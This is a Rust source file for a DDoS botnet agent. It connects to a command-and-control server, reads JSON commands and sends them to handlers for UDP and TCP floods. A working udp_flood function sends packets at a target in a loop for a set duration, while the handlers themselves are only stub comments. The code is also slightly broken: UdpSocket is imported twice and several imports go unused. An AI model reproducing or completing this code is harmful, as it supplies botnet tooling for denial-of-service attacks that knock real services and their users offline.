use std::net::{TcpStream, Shutdown};
use std::io::{Read, Write};
use serde_json::{Value, from_str};
use std::net::UdpSocket;
use std::{time, thread};

fn main() {
    let server_addr = "127.0.0.1:6969"; // TODO: change
    match TcpStream::connect(server_addr) {
        Ok(mut stream) => {
            println!("Successfully connected to server at {}", server_addr);
            
            // Main loop to listen for commands
            loop {
                let mut data = [0 as u8; 50]; // using 50 byte buffer
                match stream.read(&mut data) {
                    Ok(size) => {
                        // Handle incoming data
                        if size > 0 {
                            handle_command(&data[0..size]);
                        }
                    },
                    Err(e) => {
                        println!("Failed to receive data: {}", e);
                        stream.shutdown(Shutdown::Both).unwrap();
                        break;
                    }
                }
            }
        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}

use std::net::UdpSocket;

fn send_udp(target: &str, message: &str) -> std::io::Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0")?; // bind to a random port
    socket.send_to(message.as_bytes(), target)?;
    Ok(())
}

fn udp_flood(target: &str, duration: u64) {
    let start = time::Instant::now();
    let message = "A"; // Example message. In a real flood, this would be random or specific data.

    while start.elapsed() < time::Duration::from_secs(duration) {
        if let Err(e) = send_udp(target, message) {
            eprintln!("Failed to send UDP packet: {}", e);
            continue;
        }
    }
}

fn handle_command(data: &[u8]) {
    if let Ok(text) = std::str::from_utf8(data) {
        if let Ok(command) = from_str::<Value>(text) {
            match command["type"].as_str() {
                Some("UDP") => {
                    // Handle UDP Flood
                    // Extract IP, port, and duration from the command and perform UDP flooding
                },
                Some("TCP") => {
                    // Handle TCP Flood
                    // Similar handling as above
                },
                _ => println!("Unknown command received"),
            }
        }
    }
}
